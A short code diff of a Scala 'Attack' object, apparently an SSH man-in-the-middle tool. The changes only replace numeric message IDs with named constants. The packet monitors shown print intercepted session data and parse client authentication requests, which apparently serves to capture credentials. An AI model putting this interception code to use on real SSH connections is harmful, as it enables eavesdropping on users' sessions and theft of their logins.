@@ -104,11 +104,11 @@ object Attack{
   }
 
   def serverMonitor: Packet => Unit = p => {
-    println("from server: "+p.getBuffer.getCommand)
+    println("from server: "+ SSHMessageIds.mapSSHMessageToString(p.getBuffer.getCommand))
     val start = new Array[Int](1)
     val length = new Array[Int](1)
     p.getBuffer.getCommand match{
-      case 94 =>
+      case 94 /*Session.SSH_MSG_CHANNEL_DATA*/ =>
         val buf = p.getBuffer
         buf.getInt; buf.getByte; buf.getByte; buf.getInt
         val foo=buf.getString(start, length)
@@ -127,16 +127,16 @@ object Attack{
   }
 
   def clientMonitor: Packet => Unit =  p => {
-    println("from client: "+p.getBuffer.getCommand)
+    println("from client: "+ SSHMessageIds.mapSSHMessageToString(p.getBuffer.getCommand))
     val start = new Array[Int](1)
     val length = new Array[Int](1)
     p.getBuffer.getCommand match{
-      case 94 =>
+      case  94 /*Session.SSH_MSG_CHANNEL_DATA*/ =>
         val buf = p.getBuffer
         buf.getInt; buf.getByte; buf.getByte; buf.getInt
         val foo=buf.getString(start, length)
         println("from client> "+new String(foo, start(0), length(0)))
-      case 50 =>
+      case UserAuth.SSH_MSG_USERAUTH_REQUEST =>
         val buf = p.getBuffer
         buf.getInt; buf.getByte; buf.getByte;
         var foo=buf.getString(start, length)
@@ -154,7 +154,7 @@ object Attack{
             // SSH_MSG_USERAUTH_INFO_RESPONSE(61) should be checked.
           case _ =>
         }
-      case 61 =>
+      case UserAuth.SSH_MSG_USERAUTH_INFO_RESPONSE =>
         val buf = p.getBuffer
         buf.getInt; buf.getByte; buf.getByte;
         buf.getInt match {
